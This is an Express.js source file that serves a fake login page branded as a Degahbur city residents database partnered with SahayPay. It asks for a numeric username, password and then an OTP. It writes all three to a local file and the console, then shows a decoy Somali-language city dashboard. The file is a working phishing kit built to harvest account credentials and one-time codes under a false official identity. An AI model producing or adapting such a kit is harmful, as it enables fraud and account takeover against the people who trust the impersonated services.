const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const port = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
// Login route
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>Login</title>
        <style>
          body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
          }

          h1 {
            text-align: center;
          }

          .login-form {
            width: 450px;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #f9f9f9;

          }

          .login-form label {
            display: block;
            margin-bottom: 10px;
            font-weight: bold;
          }

          .login-form input[type="text"],
          .login-form input[type="password"] {
            width: 100%;
            padding: 15px;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 45px;
          }

          .login-form input[type="submit"] {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 3px;
            background-color: blue;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
           font-size: 45px;
          }

          .login-form input[type="submit"]:hover {
            background-color: #45a049;
          }
         h2 {
              color: green;
           }
      h3 {    color: green;
              text-align:  center;
          }
        </style>
      </head>
      <body>
        <div class="login-form">
          <h1>Login</h1>
          <h2> Degahbur City Residents Database in a partner with SahayPay.</h2>
          <form action="/otp" method="POST">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" inputMode = "numeric" required><br><br>
            <label for="password">Password:</label>
            <input type="text" id="password" name="password" inputMode = "numeric" required><br><br>
            <input type="submit" value="Submit">
          </form>
<h3> We partnered with raysmfi to make your life easier</h3>
        </div>

      </body>
    </html>
  `);
});

// OTP route
app.post('/otp', (req, res) => {
  const { username, password } = req.body;
  console.log({username})
  console.log({password})

  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>OTP</title>
        <style>
          body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
          }

          h1 {
            text-align: center;
          }

          .otp-form {
            width: 300px;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #f9f9f9;
          }

          .otp-form label {
            display: block;
            margin-bottom: 10px;
            font-weight: bold;
          }

          .otp-form input[type="text"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 3px;
           font-size: 45px;
          }

          .otp-form input[type="submit"] {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 3px;
            background-color: #4caf50;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
          }

          .otp-form input[type="submit"]:hover {
            background-color: #45a049;

          }
        </style>
      </head>
      <body>
        <div class="otp-form">
          <h1>Enter OTP</h1>
          <form action="/save" method="POST">
            <label for="otp">OTP:</label>
            <input type="text" id="otp" name="otp" inputMode = "numeric" required><br><br>
            <input type="hidden" name="username" value="${username}">
            <input type="password" name="password" value="${password}">
            <input type="submit" value="Submit">
          </form>
        </div>
      </body>
    </html>
  `);
});
//
app.post('/save', (req, res) => {
  const { username, password, otp } = req.body;
  console.log({otp})
  fs.appendFile('d.txt', `${username},${password},${otp}\n`,  (err) => {
    if (err) {
      console.error(err);
      res.send('Error saving credentials.');
      return;
    }

    res.send(` <!DOCTYPE html>
<html>
<head>
  <title>City Administration Dashboard</title>
  <style>
    /* CSS styling for the dashboard */
    body {
      font-family: Arial, sans-serif;
      background-image: url('https://example.com/mayor-background.jpg');
      background-size: cover;
      background-position: center;
      color: #fff;
      margin: 0;
      padding: 0;
    }

    h1 {
      text-align: center;
      padding: 20px;
      font-size: 32px;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      flex-wrap: wrap;
      height: 80vh;
    }

    .card {
      border: 1px solid #ccc;
      border-radius: 4px;
      padding: 20px;
      margin: 10px;
      text-align: center;
      width: 200px;
      background-color: #fff;
      color: #333;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }

    .card h2 {
      color: #555;
    }

    .completed {
      background-color: #4CAF50;
      color: #fff;
    }

    .in-progress {
      background-color: #FFC107;
      color: #fff;
    }

    .planned {
      background-color: #2196F3;
      color: #fff;
    }

    .scrollable-container {
      max-height: 200px;
      overflow-y: auto;
    }

    .scrollable-container ul {
      padding-left: 0;
      list-style: none;
      margin: 0;
    }

    .scrollable-container li {
      margin-bottom: 10px;
    }

    .scrollable-container li:last-child {
      margin-bottom: 0;
    }

    .larger-font {
      font-size: 18px;
    }
  </style>
</head>
<body>
  <h1> Xogta horumarineed ee magaalada dhagaxbuur </h1>

  <div class="container">

    <div class="card">
      <h2>Dhismaha wadooyinka</h2>
      <p class="completed">Wadooyinka la dhamaystiray: 30 km</p>
      <p class="in-progress">Xawliga geedi socodka shaqo : 50%</p>
      <p class="planned">wadooyinka la qorsheeyay: 150 km</p>
    </div>

    <div class="card">
      <h2>Biyo gallin</h2>
      <p class="completed">Biyo gallinta la dhamaystiray: 10%</p>
      <p class="in-progress">Xawliga geedi socodka shaqo: 40%</p>
      <p class="planned">Biyo gallinta la qorsheeyay: 80%</p>
    </div>

    <div class="card">
      <h2>Goobaha nasashada</h2>
      <p class="completed">Goobaha nasashada la dhamaysriray: 2 </p>
      <p class="in-progress">Goobaha nasashada la dhisayo: 5 </p>
      <p class="planned">Goobaha nasashada la qorsheeyay: 15 </p>
    </div>

    <div class="card">
      <h2>Dugsiyada</h2>
      <p class="completed">Inta ladhamaystiray: 5 </p>
      <p class="in-progress">Inta la dhisayo: 3 </p>
      <p class="planned">Inta la qorsheeyay: 10 schools</p>
    </div>

    <div class="card">
      <h2>Cisbitaalada</h2>
      <p class="completed">Inta ladhamaystirat: 0 hospitals</p>
      <p class="in-progress">Inta ladhisayo: 1 </p>
      <p class="planned">Inta la qorsheeyay: 2 </p>
    </div>

    <div class="card">
      <h2>Canshuur bixiyayaasha</h2>
      <p class="completed">Inta la maskabay: 500 </p>
      <p class="in-progress">Inta socota: 100 </p>
      <p class="planned">Inta hadhsan: 5000</p>
    </div>

    <div class="card">
      <h2>Ganacsadayaasha</h2>
      <p class="completed">:Tirada ganacsadayaasha 5000 </p>
      <p class="in-progress">Inta maskaban: 200 </p>
      <p class="planned">Inta hadhay: 4800 </p>
    </div>

    <div class="card">
      <h2>Tax Statistics</h2>
      <div class="scrollable-container">
        <ul>
          <li>Dakhliga sanadlaha ah: 1000,000,000</li>
          <li>Tirada canshuur bixiye: 5000</li>
          <li>Average Tax Rate: 15%</li>
          <li>Top Industries:
            <ul>
              <li>Technology</li>
              <li>Finance</li>
              <li>Healthcare</li>
              <li>Manufacturing</li>
              <li>Retail</li>
            </ul>
          </li>
        </ul>
      </div>
    </div>
  </div>
</body>
</html>
`);
  });
});

// Start the server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
